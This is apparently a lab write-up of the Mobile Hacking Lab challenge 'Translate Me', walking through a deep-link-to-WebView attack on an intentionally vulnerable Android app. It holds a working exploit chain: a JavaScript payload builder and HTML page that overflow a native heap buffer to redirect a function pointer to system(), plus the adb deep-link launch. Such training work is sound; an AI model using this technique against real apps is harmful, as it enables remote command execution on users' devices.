---
title: "Translate Me: From a WebView Deep Link to Arbitrary Command Execution"
date: 2026-08-19 23:30:00 +0100
categories: [Mobile Security, Android]
tags: [android, buffer-overflow, webview, memory-corruption, rce]
image:
  path: /assets/translate.png
---

**Platform:** [Mobile Hacking Lab](https://www.mobilehackinglab.com/)

**Lab: Translate Me**

**Difficulty: Advanced**


## Introduction

Translate Me is Security Lab built around a browser with real-time translation. It's presented as still in development, with a buffer overflow left behind for us to find and turn into command execution.
  
## Getting In: The Manifest and the Delivery Vector

I started with the manifest, before opening any decompiled code.

```xml
<activity
    android:name="com.mobilehackinglab.translateme.BrowserActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
    </intent-filter>
</activity>
```

`BrowserActivity` is exported, and it's registered `BROWSABLE` against plain `http`/`https` links. I checked what `onCreate()` does with the incoming intent:

```kotlin
if (getIntent() != null && getIntent().getData() != null) {
    urlToLoad = getIntent().getData().toString();
} else if (getIntent().hasExtra("url")) {
    urlToLoad = getIntent().getStringExtra("url");
}
...
webView.loadUrl(urlToLoad);
```

It loads whatever URL it's launched with. No scheme check, no host check. I kept this in mind as the delivery vector for whatever I found next — a victim wouldn't need to open the app on purpose, just tap a link.

<img width="769" height="364" alt="image" src="https://github.com/user-attachments/assets/edeb7625-4204-4477-9a7c-57977c7b12e2" />

## The Bridge: TranslatorBridge

The WebView registers a JavaScript interface as soon as it's created:

```java
this.webView.addJavascriptInterface(new TranslatorBridge(), "TranslatorBridge");
```

JavaScript is enabled and the bridge has no origin restriction, so any page the WebView loads can call every `@JavascriptInterface` method on this class from its own script, including a page loaded through the deep link I'd just found.

I went through what the bridge exposes. Beyond `translatePage()` and `translatePageBytes()`, there's `getFunctionPointer()`, which leaks the address of `dummy_function`; `getSafeExecuteAddress()`, which leaks the address of a function called `safe_execute_command`; `getMallocAddress()`, which leaks libc's `malloc`; and `createPayload(long targetAddress, String command)`, which builds a byte array out of 64 bytes of filler, an 8-byte little-endian address, and then a command string.


## libtranslator.so

I pulled the native library out of the APK and ran `checksec` on it before opening Ghidra.

```
$ checksec --file=libtranslator.so
RELRO           STACK CANARY      NX            PIE
Full RELRO      No canary found   NX enabled    DSO
```

No stack canary, NX enabled, PIE. Then I decompiled the two functions that mattered.

```c
void translate(undefined *param_1)
{
    void *__ptr = malloc(0x148);
    *(code **)((long)__ptr + 0x40) = dummy_function;
    __memset_chk(__ptr, 0, 0x40, -1);

    if (param_1 != NULL) {
        long len = __strlen_chk(param_1, -1);
        __memcpy_chk(__ptr, param_1, len, -1);

        if (*(code**)((long)__ptr + 0x40) != dummy_function &&
            *(long*)((long)__ptr + 0x40) != 0) {
            (**(code**)((long)__ptr + 0x40))(param_1);
        }
    }
    free(__ptr);
}
```

`translate()` allocates a 328-byte heap struct with a function pointer sitting at offset `0x40`, set to `dummy_function`. It only zeroes the first `0x40` bytes, then copies attacker-controlled data into the struct starting at offset 0, using `strlen()` of the input as the copy length with no check against the struct's actual size. I could feed it more than 64 bytes and walk straight through the function pointer. If what ends up at offset `0x40` is non-null and isn't `dummy_function` anymore, `translate()` calls it, passing the original input pointer as the argument.

```c
void safe_execute_command(char *param_1)

{
  char *local_18;
  
  local_18 = param_1;
  if (param_1 == (char *)0x0) {
    local_18 = "NULL";
  }
  __android_log_print(3,"TranslateMe","safe_execute_command called with: %s",local_18);
  __android_log_print(3,"TranslateMe","safe_execute_command address: %p",safe_execute_command);
  __android_log_print(3,"TranslateMe","Debug symbol: 0x%x",0xdeadcafe);
  if (param_1 != (char *)0x0) {
    system(param_1);
    __android_log_print(3,"TranslateMe","Command executed successfully");
  }
  return;
}
```

`safe_execute_command()` hands its argument straight to `system()`.

At this point the plan was clear: leak the address of `safe_execute_command`, overwrite the function pointer at offset 64 with it, and get a command through `system()`.


## First Attempt: A Crash

I used `createPayload()` the way it seemed meant to be used.

```javascript
var addr = TranslatorBridge.getSafeExecuteAddress();
var payload = TranslatorBridge.createPayload(addr, "touch /data/local/tmp/pwned;#");
TranslatorBridge.translatePageBytes(payload);
```

The overflow triggered and the callback got overwritten, but the app crashed and nothing showed up on disk. I compared the leaked address against what actually landed in the callback slot, from logcat.

```
Leaked:          0x7163b6fb5240
Callback became: 0x71633f3f5240
```

Two bytes were off: `fb b6` had turned into `3f 3f`. `0x3f` is the ASCII `?`, the Unicode replacement byte, and once I saw that I knew where to look.

`createPayload()` builds the payload as a Java `String`:

```java
return new String(payload);   // decodes raw bytes as UTF-8
```

Raw pointer bytes aren't valid UTF-8 on their own, so decoding them as UTF-8 swaps any byte sequence that doesn't parse cleanly for the replacement character. My leaked address got mangled on the way through, and calling through the corrupted pointer segfaulted the process.

I skipped `createPayload()`'s `String` construction entirely and built the byte sequence myself in JavaScript, using raw character codes from 0 to 255, then handed that to `translatePageBytes()` instead, since that method decodes on the Java side with `getBytes(StandardCharsets.ISO_8859_1)`, a lossless one-to-one mapping across that whole range.

```javascript
var addr = targetAddress; // BigInt
var bytes = [];
for (var i = 0; i < 8; i++) {
  bytes.push(Number(addr & 0xFFn));
  addr = addr >> 8n;
}
var str = "";
for (var i = 0; i < bytes.length; i++) str += String.fromCharCode(bytes[i]);
```

<img width="1074" height="377" alt="image" src="https://github.com/user-attachments/assets/825ce5e3-615a-458a-b5e9-b4f0f88a2b4b" />


## Second Attempt

With the encoding sorted, the callback landed on exactly the address I'd leaked, and logcat told me "Command executed successfully." Still nothing on disk. I looked more closely at what actually reached `safe_execute_command`.

```
safe_execute_command called with: BBBBBBBB...BBBB@[garbage]
```

My command was nowhere in that line. I'd laid the payload out as filler, then the 8-byte address, then the command, but `system()` reads a null-terminated string, and the address I'd leaked had a null byte sitting in its upper bytes, since addresses on this platform live in 48-bit canonical space. That null sat right in the middle of my payload, before the command ever got a chance to run. `system()` stopped there and just executed on the filler bytes, which explains why it "succeeded" while doing nothing at all.

I'd missed that the hijacked callback gets called with the original buffer pointer as its argument, not an offset into it, so the command had to come first, not last.

I put the command at the front, terminated it with `;#` so the shell would treat the padding and address bytes that followed as a comment, then padded up to offset 64, then appended the address.

```javascript
function buildPayload(targetAddress, command) {
  var cmdPart = command + ";#";
  var bytes = [];
  for (var i = 0; i < cmdPart.length; i++) bytes.push(cmdPart.charCodeAt(i));
  while (bytes.length < 64) bytes.push(66); // 'B' padding to offset 64

  var addr = targetAddress;
  for (var i = 0; i < 8; i++) {
    bytes.push(Number(addr & 0xFFn));
    addr = addr >> 8n;
  }

  var str = "";
  for (var i = 0; i < bytes.length; i++) str += String.fromCharCode(bytes[i]);
  return str;
}
```

## A Working Exploit

```html
<!DOCTYPE html>
<html>
<body>
<script>
  var addrNum = TranslatorBridge.getSafeExecuteAddress();
  var addrBig = BigInt(addrNum);
  var cmd = "touch /data/data/com.mobilehackinglab.translateme/pwned";
  var payload = buildPayload(addrBig, cmd);
  TranslatorBridge.translatePageBytes(payload);
</script>
</body>
</html>
```

I served this locally and triggered it through the app's own exported deep link.

```
adb shell am start -a android.intent.action.VIEW \
  -d "http://10.0.3.2:8000/exploit.html" \
  com.mobilehackinglab.translateme/.BrowserActivity
```

logcat showed the command landing intact this time.

```
translate called with: touch /data/data/com.mobilehackinglab.translateme/pwned;#BBBBBBB@[addr bytes]
Callback was overwritten! Calling at: 0x7163b7f30240
Command executed successfully
```

And when I checked the app's directory:

```
$ adb shell run-as com.mobilehackinglab.translateme ls -la /data/data/com.mobilehackinglab.translateme/
-rw-------   1 u0_a159 u0_a159    0 2026-08-19 23:06 pwned
```

A fresh, zero-byte file, owned by the app's own UID, timestamped exactly when the exploit ran.

<img width="1056" height="194" alt="image" src="https://github.com/user-attachments/assets/9e898b04-1ee0-4aad-818f-fa9e691e4844" />


## Mitigations

Intent-supplied URLs shouldn't be loaded into a WebView without an allowlist of trusted origins. Memory-leak and byte-level native sinks have no business sitting behind a `@JavascriptInterface`, since anything exposed there is reachable by any page the WebView renders. Buffer copies need to be checked against the destination's actual size rather than the source's length. Native libraries should ship with stack canaries wherever the toolchain supports them. Attacker-influenced data should never reach `system()` or `exec*()` directly, regardless of how internal the calling function looks.
